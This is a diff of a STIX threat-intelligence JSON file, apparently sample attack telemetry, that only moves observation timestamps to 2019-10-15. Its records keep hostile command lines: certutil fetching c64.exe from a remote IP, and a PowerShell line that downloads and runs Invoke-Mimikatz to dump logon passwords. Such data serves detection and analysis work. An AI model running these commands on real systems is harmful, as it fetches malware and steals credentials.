@@ -10306,12 +10306,12 @@
             "type": "observed-data"
         },
         {
-            "created": "2019-10-03T14:53:35Z",
+            "created": "2019-10-15T14:53:35Z",
             "created_by_ref": "identity--8899d562-2667-4532-8e19-b4eca6c959bd",
-            "first_observed": "2019-10-03T14:53:35Z",
+            "first_observed": "2019-10-15T14:53:35Z",
             "id": "observed-data--b7767318-6cca-4cf8-9280-826ed5f31719",
-            "last_observed": "2019-10-03T14:53:35Z",
-            "modified": "2019-10-03T14:53:35Z",
+            "last_observed": "2019-10-15T14:53:35Z",
+            "modified": "2019-10-15T14:53:35Z",
             "number_observed": 1,
             "objects": {
                 "0": {
@@ -10324,7 +10324,7 @@
                 "1": {
                     "binary_ref": "0",
                     "command_line": "certutil -urlcache -split -f http://67.229.97.229/c64.exe c64.exe",
-                    "created": "2019-10-03T14:53:35Z",
+                    "created": "2019-10-15T14:53:35Z",
                     "creator_user_ref": "0x46d94",
                     "name": "certutil.exe",
                     "opened_connection_refs": [
@@ -10372,12 +10372,12 @@
             "type": "observed-data"
         },
         {
-            "created": "2019-10-03T14:53:36Z",
+            "created": "2019-10-15T14:53:36Z",
             "created_by_ref": "identity--8899d562-2667-4532-8e19-b4eca6c959bd",
-            "first_observed": "2019-10-03T14:53:35Z",
+            "first_observed": "2019-10-15T14:53:35Z",
             "id": "observed-data--b7767318-6cca-4cf8-9280-826ed5f31719",
-            "last_observed": "2019-10-03T14:53:35Z",
-            "modified": "2019-10-03T14:53:35Z",
+            "last_observed": "2019-10-15T14:53:35Z",
+            "modified": "2019-10-15T14:53:35Z",
             "number_observed": 1,
             "objects": {
                 "0": {
@@ -10390,7 +10390,7 @@
                 "1": {
                     "binary_ref": "0",
                     "command_line": "certutil -urlcache -split -f http://67.229.97.229/c64.exe c64.exe",
-                    "created": "2019-10-03T14:53:35Z",
+                    "created": "2019-10-15T14:53:35Z",
                     "creator_user_ref": "0x46d94",
                     "name": "certutil.exe",
                     "opened_connection_refs": [
@@ -10438,12 +10438,12 @@
             "type": "observed-data"
         },
         {
-            "created": "2019-10-03T14:53:35Z",
+            "created": "2019-10-15T14:53:35Z",
             "created_by_ref": "identity--8899d562-2667-4532-8e19-b4eca6c959bd",
-            "first_observed": "2019-10-03T14:53:35Z",
+            "first_observed": "2019-10-15T14:53:35Z",
             "id": "observed-data--b7767318-6cca-4cf8-9280-826ed5f31720",
-            "last_observed": "2019-10-03T14:53:35Z",
-            "modified": "2019-10-03T14:53:35Z",
+            "last_observed": "2019-10-15T14:53:35Z",
+            "modified": "2019-10-15T14:53:35Z",
             "number_observed": 1,
             "objects": {
                 "0": {
@@ -10504,12 +10504,12 @@
             "type": "observed-data"
         },
         {
-            "created": "2019-10-03T14:53:35Z",
+            "created": "2019-10-15T14:53:35Z",
             "created_by_ref": "identity--8899d562-2667-4532-8e19-b4eca6c959bd",
-            "first_observed": "2019-10-03T14:53:35Z",
+            "first_observed": "2019-10-15T14:53:35Z",
             "id": "observed-data--b7767318-6cca-4cf8-9280-826ed5f31720",
-            "last_observed": "2019-10-03T14:53:35Z",
-            "modified": "2019-10-03T14:53:35Z",
+            "last_observed": "2019-10-15T14:53:35Z",
+            "modified": "2019-10-15T14:53:35Z",
             "number_observed": 1,
             "objects": {
                 "0": {
@@ -10522,7 +10522,7 @@
                 "1": {
                     "binary_ref": "0",
                     "command_line": "c64.exe f64.data \"9839D7F1A0 -m\"",
-                    "created": "2019-10-03T14:53:35Z",
+                    "created": "2019-10-15T14:53:35Z",
                     "creator_user_ref": "0x46d94",
                     "name": "c64.exe",
                     "opened_connection_refs": [
@@ -10570,12 +10570,12 @@
             "type": "observed-data"
         },
         {
-            "created": "2019-10-03T14:51:35Z",
+            "created": "2019-10-15T14:51:35Z",
             "created_by_ref": "identity--8899d562-2667-4532-8e19-b4eca6c959bd",
-            "first_observed": "2019-10-03T14:53:35Z",
+            "first_observed": "2019-10-15T14:53:35Z",
             "id": "observed-data--b7767318-6cca-4cf8-9280-826ed5f31720",
-            "last_observed": "2019-10-03T14:53:35Z",
-            "modified": "2019-10-03T14:53:35Z",
+            "last_observed": "2019-10-15T14:53:35Z",
+            "modified": "2019-10-15T14:53:35Z",
             "number_observed": 1,
             "objects": {
                 "0": {
@@ -10588,7 +10588,7 @@
                 "1": {
                     "binary_ref": "0",
                     "command_line": "powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\"",
-                    "created": "2019-10-03T14:53:35Z",
+                    "created": "2019-10-15T14:53:35Z",
                     "creator_user_ref": "0x46d94",
                     "name": "powershell.exe",
                     "opened_connection_refs": [
@@ -10636,12 +10636,12 @@
             "type": "observed-data"
         },
         {
-            "created": "2019-10-03T14:51:36Z",
+            "created": "2019-10-15T14:51:36Z",
             "created_by_ref": "identity--8899d562-2667-4532-8e19-b4eca6c959bd",
-            "first_observed": "2019-10-03T14:53:35Z",
+            "first_observed": "2019-10-15T14:53:35Z",
             "id": "observed-data--b7767318-6cca-4cf8-9280-826ed5f31720",
-            "last_observed": "2019-10-03T14:53:35Z",
-            "modified": "2019-10-03T14:53:35Z",
+            "last_observed": "2019-10-15T14:53:35Z",
+            "modified": "2019-10-15T14:53:35Z",
             "number_observed": 1,
             "objects": {
                 "0": {
@@ -10702,12 +10702,12 @@
             "type": "observed-data"
         },
         {
-            "created": "2019-10-01T19:29:35Z",
+            "created": "2019-10-15T19:29:35Z",
             "created_by_ref": "identity--8899d562-2667-4532-8e19-b4eca6c959bd",
-            "first_observed": "2019-10-01T19:29:35Z",
+            "first_observed": "2019-10-15T19:29:35Z",
             "id": "observed-data--b7767318-6cca-4cf8-9280-826ed5f31720",
-            "last_observed": "2019-10-01T19:29:35Z",
-            "modified": "2019-10-01T19:29:35Z",
+            "last_observed": "2019-10-15T19:29:35Z",
+            "modified": "2019-10-15T19:29:35Z",
             "number_observed": 1,
             "objects": {
                 "0": {
